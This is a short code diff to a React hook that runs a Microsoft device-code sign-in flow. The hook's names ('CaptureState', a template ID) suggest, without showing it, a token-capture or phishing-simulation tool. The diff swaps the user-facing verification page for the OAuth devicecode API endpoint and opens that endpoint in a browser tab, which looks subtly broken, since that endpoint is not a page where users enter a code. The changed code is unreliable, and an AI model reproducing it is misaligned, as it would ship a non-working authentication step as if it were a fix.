@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef, useCallback } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 export type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -114,7 +114,7 @@ export function useDeviceCodeFlow(templateId?: string): DeviceCodeFlow {
 
   const handleVerify = useCallback((): void => {
     setState('waiting');
-    window.open(DEVICE_AUTH_URL, '_blank');
+    window.open(DEVICE_VERIFY_URL, '_blank');
   }, []);
 
   const handleReset = useCallback((): void => {
